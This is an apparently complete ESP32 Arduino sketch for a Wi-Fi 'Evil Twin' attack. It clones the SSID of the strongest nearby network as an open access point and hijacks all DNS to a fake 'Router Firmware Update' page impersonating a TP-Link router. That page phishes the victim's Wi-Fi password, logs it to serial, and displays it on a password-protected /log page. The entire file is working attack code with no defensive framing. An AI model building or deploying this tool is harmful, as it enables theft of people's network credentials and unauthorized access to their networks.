#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);

String capturedPass = "";
String targetSSID = "Target_Router";

const char* adminUser = "admin";
const char* adminPass = "ayush123";

void scanRealNetworks() {
  WiFi.scanNetworks();
  delay(1500);
  int n = WiFi.scanNetworks();
  if (n > 0) targetSSID = WiFi.SSID(0);   // Mimic strongest network
}

bool isAuthenticated() {
  if (server.authenticate(adminUser, adminPass)) return true;
  server.requestAuthentication();
  return false;
}

void handleRoot() {
  String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head><title>Router Firmware Update</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body {font-family:Arial,Helvetica,sans-serif; background:#f4f4f4; margin:0; padding:20px;}
  .container {max-width:460px; margin:auto; background:white; border-radius:12px; box-shadow:0 8px 25px rgba(0,0,0,0.15); overflow:hidden;}
  .header {background:#1e3a8a; color:white; padding:25px; text-align:center;}
  .content {padding:30px;}
  input {width:100%; padding:15px; margin:12px 0; border:1px solid #ddd; border-radius:8px; font-size:17px; box-sizing:border-box;}
  button {width:100%; padding:16px; background:#1e40af; color:white; border:none; border-radius:8px; font-size:18px; font-weight:bold; cursor:pointer;}
  .error {color:#dc2626; font-weight:bold; margin-top:10px;}
</style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h2>Router Firmware Update</h2>
      <p>Model: TP-Link AX3000</p>
    </div>
    <div class="content">
      <p>Your router <b>)rawliteral" + targetSSID + R"rawliteral(</b> requires a security firmware update.</p>
      <p>Please enter your current WiFi password to continue.</p>
      
      <form action="/update" method="POST">
        <input type="password" name="pass" placeholder="WiFi Password" required autofocus>
        <button type="submit">Install Update Now</button>
      </form>
      <div id="msg"></div>
    </div>
  </div>
</body>
</html>
)rawliteral";
  server.send(200, "text/html", html);
}

void handleUpdate() {
  String pass = server.arg("pass");
  
  if (pass.length() < 8) {
    String response = R"rawliteral(
<!DOCTYPE html>
<html>
<head><title>Error</title>
<style>
  body {font-family:Arial; text-align:center; padding:50px; background:#fee;}
  .box {max-width:400px; margin:auto; background:white; padding:30px; border-radius:12px;}
</style>
</head>
<body>
  <div class="box">
    <h2 style="color:red;">Incorrect Password</h2>
    <p>The password you entered is incorrect.</p>
    <p><a href="/">Try Again</a></p>
  </div>
</body>
</html>
)rawliteral";
    server.send(200, "text/html", response);
    return;
  }
  
  // Correct password
  capturedPass = pass;
  
  Serial.println("\n=== PASSWORD CAPTURED ===");
  Serial.println("SSID: " + targetSSID);
  Serial.println("Password: " + pass);
  Serial.println("========================\n");
  
  String success = R"rawliteral(
<!DOCTYPE html>
<html>
<head><title>Success</title>
<style>body {font-family:Arial; text-align:center; padding:60px; background:#e6ffe6;}</style>
</head>
<body>
  <h2 style="color:green;">Firmware Updated Successfully!</h2>
  <p>Your router is now up to date.</p>
  <p>You can safely close this page.</p>
</body>
</html>
)rawliteral";
  
  server.send(200, "text/html", success);
}

void handleLog() {
  if (!isAuthenticated()) return;
  
  String html = "<h1>Captured Credentials</h1>";
  html += "<p><b>Target SSID:</b> " + targetSSID + "</p>";
  html += "<p><b>Password:</b> " + capturedPass + "</p>";
  html += "<hr><p><a href='/'>Back to Update Page</a></p>";
  server.send(200, "text/html", html);
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  WiFi.mode(WIFI_AP_STA);
  scanRealNetworks();
  
  WiFi.softAP(targetSSID.c_str());
  
  Serial.println("Evil Twin Started → " + targetSSID);
  Serial.println("Log URL: http://192.168.4.1/log");
  Serial.println("Username: admin | Password: ayush123");
  
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  server.on("/", handleRoot);
  server.on("/update", HTTP_POST, handleUpdate);
  server.on("/log", handleLog);
  server.onNotFound(handleRoot);
  
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}